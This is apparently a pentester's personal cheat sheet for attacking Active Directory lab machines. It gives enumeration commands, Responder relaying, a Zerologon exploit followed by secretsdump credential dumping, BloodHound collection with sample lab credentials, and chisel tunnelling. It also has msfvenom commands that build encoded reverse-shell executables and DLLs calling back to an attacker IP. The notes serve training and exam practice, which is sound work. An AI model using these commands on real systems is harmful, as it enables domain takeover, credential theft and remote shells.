# TIPS

Do not use metasploit until you have tried EVERYTHING
Try all the boxes before you try metasploit. Most likely, you want to use it on the DCs
	Def on windows at least

Don't try an exploit until you know it works. If a kernel exploit didn't work, restart the machine just in case you broke it with your exploit

# Enum

* Scan IPs
`nmap -sC -sV -iL <hostsFile>`

* Enumerate Hosts
`nxc smb <hostsFile>`

* Enumerate Shares
`nxc smb <hostsFile> -u 'a' -p '' --shares`
	If you have guest access, do a rid brute. 
	Verify with kerbrute and check if any users are as-reproastable

* Find DC IP
`nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>`

* Enumerate users through RPC
`net rpc group members 'Domain Users' -W 'megabank.local' -I 10.10.10.169 -U %`

`rpcclient -U '' -N $IP`
	`enumdomusers`
	`querydispinfo`

* Enumerate LDAP
ldapsearch -H ldap://$IP -x -s base namingcontexts
ldapsearch -H ldap://$IP -x -b '$namingContexts' 
	* Remember to do this if you get creds as well

ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b "cn=users,dc=absolute,dc=htb" "user" "description"
	-Y GSSAPI is only for if you want kerberos auth

# DNS
**MAKE SURE TO ADD STUFF TO DNS**

# Kerberos

`sudo ntpdate <IP>` to fix clock skew
	Make sure automatic time set is disabled on debian
`sudo ntpdate tick.usno.navy.mil` to set back to eastern


When working with Kerberos, it is useful to have KRB5CCACHE files.
You can do this by getting a TGT:
	getTGT.py  <domain>/<username>
And then exporting before your commands
	export KRB5CCNAME=<username>.ccache <command>

# Low-Hanging Fruit

* Responder
`sudo responder -I tun0 --lm`
	* Remeber you try this with ntlmrelayx if a DC has signing disabled

* Zerologon
**THIS IS DESTRUCTIVE!! Will get you access, but be careful**
`nxc smb $IP -M zerologon`
`python3 cve-2020-1472-exploit.py dc 10.10.86.17`
`secretsdump.py -no-pass -just-dc ustoun.local/dc\$@10.10.86.17`


* Eternal Blue

* PetitPotam

* Sysvol & GPP

* noPAC

* PrintNightmare

* Slinky



# WEB

* CLICK ON EVERY BUTTON ADAM. Do you remember PG Access?

* Is there a way for you to get a username list? 
	* Check for names on the website and in files
	* Generate name combinations.

* If there is MSSQL injection, you can get xp_cmdshell

* If there is LFI, you might be able to get a hash

# After Valid Users

* CHECK ALL USERS WITH ALL RELEVANT SERVICES (see the Manager HTB box)
	* You can try to mangle passwords to reflect their respective usernames

# After Valid Creds

Check with nxc ldap if you can query and then:
Bloodhound
	bloodhound-python -u V.Ventz -p 'HotelCalifornia194!' -ns 192.168.158.175 -d resourced.local -c All


Look at shares
	`nxc smb 10.10.10.182 -u r.thompson -p rY4n5eva -M spider_plus -o DOWNLOAD=true`
	Apparently spider_plus doesn't download some file extensions by default. use smbget
	Look at NETLOGON and SYSVOL, bc apparently you can have scripts / executables in there (See PG Nagoya)

Look at adcs
	`nxc ldap -M adcs` (and/or certipy)

Look at user descriptions
	`nxc ldap -M get-desc-users`
	`nxc ldap -M get-unixUserPassword`
	`nxc ldap -M get-userPassword`
	`nxc ldap -M user-desc` < this one will automatically search for passwords

Check smb, **winrm**, wmi, and ldap with `nxc`

For ldap, check laps and gmsa

Kerberoast and AS-Reproast

Coercer.py

If you can log in:
	whoami /priv
		MAKE SURE TO LOOK AT ALL PRIVS
		YOU ONCE MISSED "SeManageVolumePrivilege"
		YOU ALSO ONCE MISSED "SeImpersonatePrivilege"????? IDIOT
	whoami /groups
		Look up interesting groups (esp domain groups) to see if they have any special privs (like executing a lolbin)
		DO THIS ADAM -- ESPECIALLY IF YOU'RE NOT ON AD BC YOU WONT SEE ANYTHING IN BLOODHOUND
	Make sure to look at important files in user directory
	cmdkey /list
		winPEAS will do this for you, but just in case it doesnt work
	net localgroup
	net group
	net user

# Privesc / Lateral Movement

Make sure to individually look for paths between your owned users and the users/machines you want to get to
	Think RBCD

Look for creds in powershell history files

Look for listening ports (esp if they're localhost only or blocked on the firewall)
	forward with:
	chisel server --reverse --port 8080
	.\chisel.exe client <tun0>:8080 R:<port>:127.0.0.1:<port>
		You can do more than one R:... per line


For potato attacks (SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege), use these CLSIDs if the os is listed:
	https://ohpe.it/juicy-potato/CLSID/


# LAST DITCH

vuln scan: sudo nmap --script vuln -p139,445 192.168.158.40 -oN smb_vuln.nmap
	maybe exclude the ports

bruteforcing. hydra is good for this


just in case sliver doesn't work:

powershell empire is allowed, so I assume this is too: 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.243 LPORT=443 -f exe -a x64 --platform windows -b '\x00' -e x64/xor_dynamic -o shell.exe

* Sliver dlls are no good:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.243 LPORT=4444 -f dll -o tzres.dll

If a shell isn't working, check to see if firewall rules aren't working (idk how to do this)

First try 80/443/8080. If that doesn't work, you can set up the revshell listener on a port that is already listening on the machine

